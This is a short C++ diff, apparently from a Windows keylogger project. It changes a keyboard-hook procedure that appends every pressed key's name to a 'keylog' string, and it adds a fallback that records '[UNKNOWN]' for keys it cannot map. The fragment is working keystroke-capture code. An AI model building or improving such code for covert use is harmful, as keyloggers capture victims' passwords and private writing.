@@ -1,5 +1,6 @@
 #include <iostream>
 #include <fstream>
+#include <stdexcept>
 #include <windows.h>
 
 #include <vector>
@@ -22,7 +23,16 @@ LRESULT KeyboardManager::KeyboardProc(int nCode, WPARAM wparam, LPARAM lparam)
 
 	if (wparam == WM_KEYDOWN || wparam == WM_SYSKEYDOWN)
 	{
-		keylog += KEYS[kbs->vkCode].Name;
+		/**
+		 * Add key to keylog variable, if
+		 * it can't be found in the map, then
+		 * append [UNKNOWN] instead
+		 **/
+		try {
+			keylog += KEYS.at(kbs->vkCode).Name;
+		} catch (const std::out_of_range& e) {
+			keylog += "[UNKNOWN]";
+		}
 		if (kbs->vkCode == VK_RETURN)
 			keylog += '\n';
 	}
